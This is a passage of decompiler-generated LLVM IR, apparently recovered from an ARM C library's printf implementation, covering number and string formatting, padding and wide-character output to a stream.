  %storemerge93 = phi i32 [ %v2_12d5c, %.thread15 ], [ 1024, %dec_label_pc_12d38 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_12d6080, i32* @r2, align 4
  %v3_12d64 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_12d64, i32* @r1, align 4
  %v0_12d68 = call i32 @_load_inttype()
  store i32 %v0_12d68, i32* @r2, align 4
  %v0_12d74 = load i32, i32* @r1, align 4
  store i32 %v0_12d74, i32* @r3, align 4
  store i32 %v2_12d78, i32* %r0.global-to-local, align 4
  %v2_12d80 = call i32 @_uintmaxtostr(i8* %v1_12d80)
  store i32 %v2_12d80, i32* %r0.global-to-local, align 4
  store i32 %v2_12d80, i32* @r4, align 4
  br i1 %v3_12d90, label %bb160, label %dec_label_pc_12d94

dec_label_pc_12d94:                               ; preds = %bb157
  %v3_12d80 = inttoptr i32 %v2_12d80 to i8*
  %v3_12d94 = load i8, i8* %v3_12d80, align 1
  %v7_12d98 = icmp eq i8 %v3_12d94, 45
  %v2_12da0 = or i32 %v0_12d08, 2
  %v2_12da0.stack_var_-336.0 = select i1 %v7_12d98, i32 %v2_12da0, i32 %v0_12d08
  br i1 %v7_12d98, label %.thread17, label %dec_label_pc_12db4

.thread17:                                        ; preds = %dec_label_pc_12d94
  %v3_12da4 = add i32 %v2_12d80, 1
  store i32 %v3_12da4, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_12db4:                               ; preds = %dec_label_pc_12d94
  %v1_12db4 = and i32 %v2_12da0.stack_var_-336.0, 2
  %v2_12db4 = icmp eq i32 %v1_12db4, 0
  br i1 %v2_12db4, label %dec_label_pc_12dc0, label %bb158

bb158:                                            ; preds = %dec_label_pc_12db4
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_12dc0:                               ; preds = %dec_label_pc_12db4
  %v1_12dc0 = urem i32 %v2_12da0.stack_var_-336.0, 2
  %v2_12dc0 = icmp eq i32 %v1_12dc0, 0
  br i1 %v2_12dc0, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_12dc0
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_12dc0, %bb159
  %v0_12e1c = phi i32 [ %v2_12d80, %bb157 ], [ %v3_12da4, %.thread17 ], [ %v2_12d80, %dec_label_pc_12dc0 ], [ %v2_12d80, %bb159 ], [ %v2_12d80, %bb158 ]
  %v0_12dd8 = phi i32 [ %v0_12d08, %bb157 ], [ %v2_12da0, %.thread17 ], [ %v0_12d08, %dec_label_pc_12dc0 ], [ %v0_12d08, %bb159 ], [ %v0_12d08, %bb158 ]
  %v3_12dc8 = load i32, i32* %stack_var_-348, align 4
  %v1_12dd0 = icmp slt i32 %v3_12dc8, 0
  br i1 %v1_12dd0, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_12dc8, %bb160 ]
  %v0_12e00 = phi i32 [ 1, %bb161 ], [ %v3_12dc8, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_12dd8 = and i32 %v0_12dd8, 16
  %v2_12dd8 = icmp eq i32 %v1_12dd8, 0
  %v2_12de4 = sub i32 %v2_12d78, %v0_12e1c
  store i32 %v2_12de4, i32* @r5, align 4
  br i1 %v2_12dd8, label %bb169, label %dec_label_pc_12dec

dec_label_pc_12dec:                               ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_12dec
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_12dec, %bb163
  br i1 %v7_12df8, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_12e00, %v2_12de4
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_12e04, label %dec_label_pc_12e0c, label %bb169

dec_label_pc_12e0c:                               ; preds = %bb167
  %v1_12e0c = inttoptr i32 %v0_12e1c to i8*
  %v2_12e0c = load i8, i8* %v1_12e0c, align 1
  %v7_12e10 = icmp eq i8 %v2_12e0c, 48
  br i1 %v7_12e10, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_12e0c
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_12e0c
  %v2_12e18 = add i32 %v2_12de4, 1
  store i32 %v2_12e18, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_12e5c = phi i32 [ %v0_12e00, %bb167 ], [ %v0_12e00, %bb162 ], [ 1, %bb168 ], [ %v2_12e18, %.thread24 ], [ %v0_12e00, %bb166 ]
  %v1_12e1c = inttoptr i32 %v0_12e1c to i8*
  %v2_12e1c = load i8, i8* %v1_12e1c, align 1
  %v7_12e20 = icmp eq i8 %v2_12e1c, 48
  br i1 %v7_12e20, label %dec_label_pc_12e28, label %dec_label_pc_12e58

dec_label_pc_12e28:                               ; preds = %bb169
  %v0_12e2c = load i32, i32* @r6, align 4
  %v7_12e30 = icmp slt i32 %v0_12e2c, 6
  br i1 %v7_12e30, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_12e28
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_12e28, %bb170
  br i1 %v7_12d48, label %.thread27, label %dec_label_pc_12e4c

.thread27:                                        ; preds = %bb171
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -5448), i32* @r4, align 4
  br label %dec_label_pc_12e64

dec_label_pc_12e4c:                               ; preds = %bb171
  %v2_12e4c = icmp eq i32 %v5_12e5c, 0
  br i1 %v2_12e4c, label %bb172, label %dec_label_pc_12e58

bb172:                                            ; preds = %dec_label_pc_12e4c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12e64

dec_label_pc_12e58:                               ; preds = %dec_label_pc_12e4c, %bb169
  %v2_12e58 = sub i32 %v5_12e5c, %v2_12de4
  %tmp211 = icmp ugt i32 %v5_12e5c, %v2_12de4
  br i1 %tmp211, label %.thread85, label %dec_label_pc_12e64

.thread85:                                        ; preds = %dec_label_pc_12e58
  store i32 %v2_12e58, i32* @r8, align 4
  br label %dec_label_pc_13070thread-pre-split

dec_label_pc_12e64:                               ; preds = %dec_label_pc_12e58, %.thread27, %bb172
  %v1_13074.pre205 = phi i32 [ %v2_12de4, %dec_label_pc_12e58 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_13070thread-pre-split

dec_label_pc_12e6c:                               ; preds = %dec_label_pc_12cd0
  br i1 %tmp208, label %dec_label_pc_12eac, label %dec_label_pc_12e74

dec_label_pc_12e74:                               ; preds = %dec_label_pc_12e6c
  %v3_12e84 = load i32, i32* %stack_var_-72, align 4
  %v0_12e88 = load i32, i32* @fp, align 4
  store i32 %v0_12e88, i32* %r0.global-to-local, align 4
  %v1_12e8c = inttoptr i32 %v3_12e84 to i32*
  %v2_12e8c = load i32, i32* %v1_12e8c, align 4
  store i32 %v2_12e8c, i32* %r2.global-to-local, align 4
  %v3_12e8c = add i32 %v3_12e84, 4
  %v4_12e8c = inttoptr i32 %v3_12e8c to i32*
  %v5_12e8c = load i32, i32* %v4_12e8c, align 4
  %v8_12e90 = call i32 @_fpmaxtostr(i32 %v0_12e88, double bitcast (i64 sext (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -87420) to i64) to double), i32 %v2_12e8c, i32 %v5_12e8c, i32 %v2_13020, i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -87420))
  store i32 %v8_12e90, i32* %r0.global-to-local, align 4
  %v1_12e94 = icmp slt i32 %v8_12e90, 0
  br i1 %v1_12e94, label %dec_label_pc_131c8, label %dec_label_pc_12e9c

dec_label_pc_12e9c:                               ; preds = %dec_label_pc_12e74
  %v2_12ea0 = add i32 %v8_12e90, %v1_130a0
  store i32 %v2_12ea0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_131b4

dec_label_pc_12eac:                               ; preds = %dec_label_pc_12e6c
  br i1 %v3_12eb0, label %dec_label_pc_12f34, label %dec_label_pc_12eb4

dec_label_pc_12eb4:                               ; preds = %dec_label_pc_12eac
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_12ebc = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_12ebc, i32* %r0.global-to-local, align 4
  br i1 %v7_12eac, label %dec_label_pc_12ec4, label %dec_label_pc_12efc

dec_label_pc_12ec4:                               ; preds = %dec_label_pc_12eb4
  %v1_12ec4 = inttoptr i32 %v3_12ebc to i32*
  %v2_12ec4 = load i32, i32* %v1_12ec4, align 4
  %v9_12ec8 = icmp eq i32 %v2_12ec4, 0
  store i32 %v2_12ec4, i32* %stack_var_-44, align 4
  br i1 %v9_12ec8, label %dec_label_pc_12f74, label %dec_label_pc_12ed4

dec_label_pc_12ed4:                               ; preds = %dec_label_pc_12ec4
  %v3_12ed4 = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_12ed8, i32* @r0, align 4
  %v4_12edc = ashr i32 %v3_12ed4, 31
  %v5_12edc = or i32 %v4_12edc, %v3_12ed4
  store i32 %v5_12edc, i32* %r2.global-to-local, align 4
  store i32 %v2_12ed8, i32* @r1, align 4
  %v6_12ee8 = call i32 @__GI_wcsrtombs(i32 %v2_12ed8, i32 %v2_12ed8, i32 %v5_12edc, i32 %v2_12ee4, i32 0, i32 %v2_12ec4)
  store i32 %v6_12ee8, i32* %r0.global-to-local, align 4
  %v3_12eec = icmp eq i32 %v6_12ee8, -1
  store i32 %v6_12ee8, i32* @r5, align 4
  br i1 %v3_12eec, label %dec_label_pc_131c8, label %dec_label_pc_13060

dec_label_pc_12efc:                               ; preds = %dec_label_pc_12eb4
  store i32 %v2_12fdc, i32* %r7.global-to-local, align 4
  %v1_12f00 = inttoptr i32 %v3_12ebc to i32*
  %v2_12f00 = load i32, i32* %v1_12f00, align 4
  store i32 %v2_12ee4, i32* %r2.global-to-local, align 4
  store i32 %v2_12fdc, i32* %r0.global-to-local, align 4
  %v5_12f0c = call i32 @__GI_wcrtomb(i32 %v2_12fdc, i32 %v2_12f00, i32 %v2_12ee4, i32 %tmp105, i32 0)
  store i32 %v5_12f0c, i32* %r0.global-to-local, align 4
  %v7_12f10 = icmp eq i32 %v5_12f0c, -1
  store i32 %v5_12f0c, i32* @r5, align 4
  br i1 %v7_12f10, label %dec_label_pc_131c8, label %dec_label_pc_12f1c

dec_label_pc_12f1c:                               ; preds = %dec_label_pc_12efc
  %v0_12f1c = load i32, i32* @sl, align 4
  store i32 %v0_12f1c, i32* @r8, align 4
  store i32 %v2_12fdc, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_12f2c = trunc i32 %v0_12f1c to i8
  %v2_12f2c = load i32, i32* %r7.global-to-local, align 4
  %v4_12f2c = add i32 %v2_12f2c, %v5_12f0c
  %v5_12f2c = inttoptr i32 %v4_12f2c to i8*
  store i8 %v1_12f2c, i8* %v5_12f2c, align 1
  %v0_13074.pre.pre = load i32, i32* @r8, align 4
  %v1_13074.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13070thread-pre-split

dec_label_pc_12f34:                               ; preds = %dec_label_pc_12eac
  br i1 %v3_12f38, label %dec_label_pc_12fd0, label %dec_label_pc_12f3c

dec_label_pc_12f3c:                               ; preds = %dec_label_pc_12f34
  %v3_12f3c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_12f3c, i32* %r0.global-to-local, align 4
  %v1_12f44 = inttoptr i32 %v3_12f3c to i32*
  %v2_12f44 = load i32, i32* %v1_12f44, align 4
  br i1 %v7_12f34, label %dec_label_pc_12f44, label %dec_label_pc_12fa8

dec_label_pc_12f44:                               ; preds = %dec_label_pc_12f3c
  store i32 %v2_12f44, i32* @r4, align 4
  %v2_12f48 = icmp eq i32 %v2_12f44, 0
  br i1 %v2_12f48, label %dec_label_pc_12f74, label %dec_label_pc_12f50

dec_label_pc_12f50:                               ; preds = %dec_label_pc_12f44, %dec_label_pc_12fd8
  %v0_12f54 = phi i32 [ %v2_12f44, %dec_label_pc_12f44 ], [ %v3_12fe8, %dec_label_pc_12fd8 ]
  %v3_12f50 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_12f54, i32* %r0.global-to-local, align 4
  %v4_12f58 = ashr i32 %v3_12f50, 31
  %v5_12f58 = or i32 %v4_12f58, %v3_12f50
  %v2_12f5c = inttoptr i32 %v0_12f54 to i8*
  %v3_12f5c = call i32 @strnlen(i8* %v2_12f5c, i32 %v5_12f58)
  store i32 %v3_12f5c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_12f5c, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_13070

dec_label_pc_12f74:                               ; preds = %dec_label_pc_12f44, %dec_label_pc_12ec4
  %v3_12f74 = load i32, i32* %stack_var_-348, align 4
  %v1_12f78 = icmp slt i32 %v3_12f74, 0
  br i1 %v1_12f78, label %dec_label_pc_12f90, label %dec_label_pc_12f80

dec_label_pc_12f80:                               ; preds = %dec_label_pc_12f74
  %tmp212 = icmp ult i32 %v3_12f74, 6
  br i1 %tmp212, label %dec_label_pc_12f98, label %dec_label_pc_12f90

dec_label_pc_12f90:                               ; preds = %dec_label_pc_12f80, %dec_label_pc_12f74
  br label %dec_label_pc_12f98

dec_label_pc_12f98:                               ; preds = %dec_label_pc_12f80, %dec_label_pc_12f90
  %storemerge97 = phi i32 [ 6, %dec_label_pc_12f90 ], [ 0, %dec_label_pc_12f80 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -5440), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_13070

dec_label_pc_12fa8:                               ; preds = %dec_label_pc_12f3c
  store i32 %v2_12f44, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_12fdc, i32* @r4, align 4
  store i32 %v2_12f44, i32* %stack_var_-200, align 4
  br label %dec_label_pc_13070thread-pre-split

dec_label_pc_12fd0:                               ; preds = %dec_label_pc_12f34
  br i1 %v7_12fd0, label %dec_label_pc_12fd8, label %dec_label_pc_12ff4

dec_label_pc_12fd8:                               ; preds = %dec_label_pc_12fd0
  %v0_12fd8 = call i32 @__GI___errno_location()
  store i32 %v0_12fd8, i32* %r0.global-to-local, align 4
  %v1_12fe0 = inttoptr i32 %v0_12fd8 to i32*
  %v2_12fe0 = load i32, i32* %v1_12fe0, align 4
  store i32 %v2_12fe0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_12fe8 = call i32 @__GI___glibc_strerror_r(i32 %v2_12fe0, i32 %v2_12fdc, i32 128)
  store i32 %v3_12fe8, i32* %r0.global-to-local, align 4
  store i32 %v3_12fe8, i32* @r4, align 4
  br label %dec_label_pc_12f50

dec_label_pc_12ff4:                               ; preds = %dec_label_pc_12fd0
  %v4_12ffc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 1072) to i32*), align 4
  %v1_13004 = add i32 %v4_12ffc, 10
  store i32 %v1_13004, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13008

dec_label_pc_13008:                               ; preds = %dec_label_pc_13050, %dec_label_pc_12ff4
  %v1_13018 = phi i32 [ %v1_13050, %dec_label_pc_13050 ], [ %v4_12ffc, %dec_label_pc_12ff4 ]
  %v1_13008 = inttoptr i32 %v1_13018 to i8*
  %v2_13008 = load i8, i8* %v1_13008, align 1
  %v3_13008 = zext i8 %v2_13008 to i32
  store i32 %v3_13008, i32* %r2.global-to-local, align 4
  %v9_13010 = icmp eq i32 %v3_13008, %tmp99
  br i1 %v9_13010, label %dec_label_pc_13018, label %dec_label_pc_13050

dec_label_pc_13018:                               ; preds = %dec_label_pc_13008
  %v2_13018 = sub i32 %v1_13018, %v4_12ffc
  %v0_1301c = load i32, i32* @fp, align 4
  store i32 %v0_1301c, i32* %r0.global-to-local, align 4
  store i32 %v2_13024, i32* %r2.global-to-local, align 4
  %v4_1302c = mul i32 %v2_13018, 4
  %v5_1302c = add i32 %v4_1302c, add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 26612)
  %v6_1302c = inttoptr i32 %v5_1302c to i32*
  %v7_1302c = load i32, i32* %v6_1302c, align 4
  store i32 %v7_1302c, i32* @ip, align 4
  store i32 77880, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_1302c)
  %v0_13038 = load i32, i32* %r0.global-to-local, align 4
  %v1_13038 = icmp slt i32 %v0_13038, 0
  br i1 %v1_13038, label %dec_label_pc_131c8, label %dec_label_pc_13040

dec_label_pc_13040:                               ; preds = %dec_label_pc_13018
  %v2_13044 = add i32 %v0_13038, %v1_130a0
  br label %dec_label_pc_131b4

dec_label_pc_13050:                               ; preds = %dec_label_pc_13008
  %v1_13050 = add i32 %v1_13018, 1
  %v3_13054 = icmp ult i32 %v1_13050, %v1_13004
  br i1 %v3_13054, label %dec_label_pc_13008, label %dec_label_pc_131c8

dec_label_pc_13060:                               ; preds = %dec_label_pc_12ed4
  %v0_13060 = load i32, i32* @sl, align 4
  store i32 %v0_13060, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_13060, i32* @r4, align 4
  br label %dec_label_pc_13070

dec_label_pc_13070thread-pre-split:               ; preds = %.thread85, %dec_label_pc_12e64, %dec_label_pc_12f1c, %dec_label_pc_12fa8
  %v1_13074.pre = phi i32 [ %v1_13074.pre205, %dec_label_pc_12e64 ], [ %v1_13074.pre.pre, %dec_label_pc_12f1c ], [ 1, %dec_label_pc_12fa8 ], [ %v2_12de4, %.thread85 ]
  %v0_13074.pre = phi i32 [ 0, %dec_label_pc_12e64 ], [ %v0_13074.pre.pre, %dec_label_pc_12f1c ], [ 0, %dec_label_pc_12fa8 ], [ %v2_12e58, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_12dd8, %dec_label_pc_12e64 ], [ %v0_12d08, %dec_label_pc_12f1c ], [ %v0_12d08, %dec_label_pc_12fa8 ], [ %v0_12dd8, %.thread85 ]
  %v0_13070.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_13070

dec_label_pc_13070:                               ; preds = %dec_label_pc_13070thread-pre-split, %dec_label_pc_12f98, %dec_label_pc_12f50, %dec_label_pc_13060
  %v1_13074 = phi i32 [ %v1_13074.pre, %dec_label_pc_13070thread-pre-split ], [ %storemerge97, %dec_label_pc_12f98 ], [ %v3_12f5c, %dec_label_pc_12f50 ], [ %v6_12ee8, %dec_label_pc_13060 ]
  %v0_13074 = phi i32 [ %v0_13074.pre, %dec_label_pc_13070thread-pre-split ], [ 0, %dec_label_pc_12f98 ], [ 0, %dec_label_pc_12f50 ], [ %v0_13060, %dec_label_pc_13060 ]
  %v0_1307c = phi i32 [ %v0_13070.pr, %dec_label_pc_13070thread-pre-split ], [ 11, %dec_label_pc_12f98 ], [ 11, %dec_label_pc_12f50 ], [ 11, %dec_label_pc_13060 ]
  %v0_130bc = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_13070thread-pre-split ], [ %v0_12d08, %dec_label_pc_12f98 ], [ %v0_12d08, %dec_label_pc_12f50 ], [ %v0_12d08, %dec_label_pc_13060 ]
  %v7_13070 = icmp eq i32 %v0_1307c, 11
  %v2_13074 = add i32 %v1_13074, %v0_13074
  br i1 %v7_13070, label %dec_label_pc_1308c, label %bb173

bb173:                                            ; preds = %dec_label_pc_13070
  %v7_13084 = icmp sgt i32 %v0_1307c, 5
  %. = select i1 %v7_13084, i32 2, i32 1
  %v2_13088 = add i32 %v2_13074, %.
  br label %dec_label_pc_1308c

dec_label_pc_1308c:                               ; preds = %dec_label_pc_13070, %bb173
  %v0_130a0 = phi i32 [ %v2_13074, %dec_label_pc_13070 ], [ %v2_13088, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_13090 = icmp uge i32 %tmp98, %v0_130a0
  %v9_13090 = icmp eq i32 %tmp98, %v0_130a0
  %v2_13094 = xor i1 %v9_13090, true
  %v3_13094 = and i1 %v3_13090, %v2_13094
  br i1 %v3_13094, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_1308c
  %v2_13090 = sub i32 %tmp98, %v0_130a0
  store i32 %v2_13090, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_1308c, %bb174
  store i32 %v1_130a0, i32* %r2.global-to-local, align 4
  %v2_1309c = xor i1 %v3_13090, true
  %v3_1309c = or i1 %v9_13090, %v2_1309c
  br i1 %v3_1309c, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_130a4.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_130b4 = phi i32 [ %v1_130a4.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_130a0 = add i32 %v0_130a0, %v1_130a0
  %v2_130a4 = add i32 %v2_130a0, %v2_130b4
  %v0_130b0 = load i32, i32* @sb, align 4
  %v7_130b0 = icmp eq i32 %v0_130b0, 48
  br i1 %v7_130b0, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_130b4 = add i32 %v2_130b4, %v0_13074
  store i32 %v3_130b4, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_130cc = phi i32 [ %v2_130b4, %bb177 ], [ 0, %bb178 ]
  %v1_130bc = and i32 %v0_130bc, 8
  store i32 %v1_130bc, i32* @r7, align 4
  %v2_130bc = icmp eq i32 %v1_130bc, 0
  br i1 %v2_130bc, label %dec_label_pc_130c4, label %dec_label_pc_130e0

dec_label_pc_130c4:                               ; preds = %.thread30
  %v0_130c4 = load i32, i32* @fp, align 4
  store i32 %v0_130c4, i32* %r0.global-to-local, align 4
  store i32 %v0_130cc, i32* %r2.global-to-local, align 4
  %v4_130d0 = call i32 @_charpad(i32 %v0_130c4, i8 32, i32 %v0_130cc)
  store i32 %v4_130d0, i32* %r0.global-to-local, align 4
  %v1_130d4 = load i32, i32* @sl, align 4
  %v9_130d4 = icmp eq i32 %v4_130d0, %v1_130d4
  br i1 %v9_130d4, label %dec_label_pc_130dc, label %dec_label_pc_131c8

dec_label_pc_130dc:                               ; preds = %dec_label_pc_130c4
  %v0_130dc = load i32, i32* @r7, align 4
  store i32 %v0_130dc, i32* @sl, align 4
  %v0_130e8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_130e0

dec_label_pc_130e0:                               ; preds = %.thread30, %dec_label_pc_130dc
  %v0_130e8 = phi i32 [ %v0_1307c, %.thread30 ], [ %v0_130e8.pre, %dec_label_pc_130dc ]
  %v0_130e4 = load i32, i32* @fp, align 4
  %v2_130e8 = add i32 %v0_130e8, add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -5432)
  store i32 %v2_130e8, i32* %r0.global-to-local, align 4
  %v2_130ec = inttoptr i32 %v2_130e8 to i8*
  %v3_130ec = call i32 @__GI_fputs_unlocked(i8* %v2_130ec, i32 %v0_130e4)
  %v0_130f0 = load i32, i32* @fp, align 4
  store i32 %v0_130f0, i32* %r0.global-to-local, align 4
  %v0_130f8 = load i32, i32* @r8, align 4
  store i32 %v0_130f8, i32* %r2.global-to-local, align 4
  %v4_130fc = call i32 @_charpad(i32 %v0_130f0, i8 48, i32 %v0_130f8)
  store i32 %v4_130fc, i32* %r0.global-to-local, align 4
  %v1_13100 = load i32, i32* @r8, align 4
  %v9_13100 = icmp eq i32 %v4_130fc, %v1_13100
  br i1 %v9_13100, label %dec_label_pc_13108, label %dec_label_pc_131c8

dec_label_pc_13108:                               ; preds = %dec_label_pc_130e0
  %v3_13108 = load i32, i32* %stack_var_-44, align 4
  %v2_1310c = icmp eq i32 %v3_13108, 0
  br i1 %v2_1310c, label %dec_label_pc_13114, label %dec_label_pc_13138

dec_label_pc_13114:                               ; preds = %dec_label_pc_13108
  %v0_13114 = load i32, i32* @r5, align 4
  %v2_13114 = icmp eq i32 %v0_13114, 0
  br i1 %v2_13114, label %dec_label_pc_1319c, label %dec_label_pc_1311c

dec_label_pc_1311c:                               ; preds = %dec_label_pc_13114
  %v0_1311c = load i32, i32* @r4, align 4
  store i32 %v0_1311c, i32* %r0.global-to-local, align 4
  %v0_13124 = load i32, i32* @fp, align 4
  store i32 %v0_13124, i32* %r2.global-to-local, align 4
  %v3_13128 = inttoptr i32 %v0_13124 to i16*
  %v4_13128 = call i32 @__stdio_fwrite(i32 %v0_1311c, i32 %v0_13114, i16* %v3_13128)
  store i32 %v4_13128, i32* %r0.global-to-local, align 4
  %v1_1312c = load i32, i32* @r5, align 4
  %v9_1312c = icmp eq i32 %v4_13128, %v1_1312c
  br i1 %v9_1312c, label %dec_label_pc_1319c, label %dec_label_pc_131c8

dec_label_pc_13138:                               ; preds = %dec_label_pc_13108
  store i32 %v2_12fdc, i32* @r6, align 4
  store i32 %v2_12ed8, i32* @r8, align 4
  store i32 %v2_12ee4, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_13188.pr = load i32, i32* @r5, align 4
  %v2_1318841 = icmp eq i32 %v0_13188.pr, 0
  store i32 %v2_12ed8, i32* @r1, align 4
  store i32 %v2_12fdc, i32* @r0, align 4
  br i1 %v2_1318841, label %dec_label_pc_1319c, label %dec_label_pc_13150

dec_label_pc_13150:                               ; preds = %dec_label_pc_13138, %dec_label_pc_13184
  %v1_13154 = phi i32 [ %v2_13184, %dec_label_pc_13184 ], [ %v0_13188.pr, %dec_label_pc_13138 ]
  %v2_13150 = icmp ult i32 %v1_13154, 128
  %.v1_13154 = select i1 %v2_13150, i32 %v1_13154, i32 128
  store i32 %.v1_13154, i32* %r2.global-to-local, align 4
  %v6_1315c = call i32 @__GI_wcsrtombs(i32 %v2_12fdc, i32 %v2_12ed8, i32 %.v1_13154, i32 %v2_12ee4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_1315c, i32* @r4, align 4
  %v2_13160 = icmp eq i32 %v6_1315c, 0
  store i32 %v6_1315c, i32* %r0.global-to-local, align 4
  br i1 %v2_13160, label %dec_label_pc_13184, label %dec_label_pc_1316c

dec_label_pc_1316c:                               ; preds = %dec_label_pc_13150
  store i32 %v2_12fdc, i32* %r0.global-to-local, align 4
  %v0_13174 = load i32, i32* @fp, align 4
  store i32 %v0_13174, i32* %r2.global-to-local, align 4
  %v3_13178 = inttoptr i32 %v0_13174 to i16*
  %v4_13178 = call i32 @__stdio_fwrite(i32 %v2_12fdc, i32 %v6_1315c, i16* %v3_13178)
  store i32 %v4_13178, i32* %r0.global-to-local, align 4
  %v1_1317c = load i32, i32* @r4, align 4
  %v9_1317c = icmp eq i32 %v4_13178, %v1_1317c
  br i1 %v9_1317c, label %dec_label_pc_13184, label %dec_label_pc_131c8

dec_label_pc_13184:                               ; preds = %dec_label_pc_1316c, %dec_label_pc_13150
  %v0_13184 = phi i32 [ %v4_13178, %dec_label_pc_1316c ], [ 0, %dec_label_pc_13150 ]
  %v1_13184 = load i32, i32* @r5, align 4
  %v2_13184 = sub i32 %v1_13184, %v0_13184
  store i32 %v2_13184, i32* @r5, align 4
  %v2_13188 = icmp eq i32 %v2_13184, 0
  store i32 %v2_12ed8, i32* @r1, align 4
  store i32 %v2_12fdc, i32* @r0, align 4
  br i1 %v2_13188, label %dec_label_pc_1319c, label %dec_label_pc_13150

dec_label_pc_1319c:                               ; preds = %dec_label_pc_13184, %dec_label_pc_13138, %dec_label_pc_1311c, %dec_label_pc_13114
  %v0_1319c = load i32, i32* @fp, align 4
  store i32 %v0_1319c, i32* %r0.global-to-local, align 4
  %v0_131a4 = load i32, i32* @sl, align 4
  store i32 %v0_131a4, i32* %r2.global-to-local, align 4
  %v4_131a8 = call i32 @_charpad(i32 %v0_1319c, i8 32, i32 %v0_131a4)
  store i32 %v4_131a8, i32* %r0.global-to-local, align 4
  %v1_131ac = load i32, i32* @sl, align 4
  %v9_131ac = icmp eq i32 %v4_131a8, %v1_131ac
  br i1 %v9_131ac, label %dec_label_pc_131b4, label %dec_label_pc_131c8

dec_label_pc_131b4:                               ; preds = %dec_label_pc_1319c, %dec_label_pc_13040, %dec_label_pc_12e9c, %dec_label_pc_12cac
  %stack_var_-336.4 = phi i32 [ %v0_12d08, %dec_label_pc_12cac ], [ %v0_130bc, %dec_label_pc_1319c ], [ %v0_12d08, %dec_label_pc_13040 ], [ %v0_12d08, %dec_label_pc_12e9c ]
  %stack_var_-356.3 = phi i32 [ %v1_130a0, %dec_label_pc_12cac ], [ %v2_130a4, %dec_label_pc_1319c ], [ %v2_13044, %dec_label_pc_13040 ], [ %v2_12ea0, %dec_label_pc_12e9c ]
